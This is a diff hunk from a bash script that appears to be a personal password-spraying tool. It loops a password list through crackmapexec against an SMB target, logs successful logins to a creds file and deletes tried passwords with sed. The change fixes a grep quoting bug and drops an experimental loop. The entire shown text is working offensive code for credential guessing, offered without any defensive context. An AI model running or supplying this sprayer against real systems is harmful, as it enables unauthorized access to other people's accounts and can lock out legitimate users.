@@ -59,23 +59,14 @@ for pass in $(cat $3); dp
 	  crackmapexec smb $1 -u $2 -p $pass --log ~/Documents/sprays/spraygun.txt
 	  echo $pass > ~/Documents/sprays/used-passwords.txt
 	  echo "found creds: "
-	  cat ~/Documents/sprays/spraygun.txt | grep -ai '[+] | tee -a ~/Documents/sprays/creds.txt
+	  cat ~/Documents/sprays/spraygun.txt | grep -ai '[+]' | tee -a ~/Documents/sprays/creds.txt
 	  sed -i "/$pass/d" $3
 	  $sleep-timer
 done
 
 
 ### trying to figure out sed with spaces
-for pass in $(cat $1); do
-	  echo "$pass" >> used.txt
-	  echo "found creds: "
-	  
-	  sed -i "/'$pass\s'/d" $1
-	  sed -i "/$pass/d" $1
-	  
-	  echo "removed " $pass
-	  sleep 2s
-done
+## not going well lol :(
 #<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
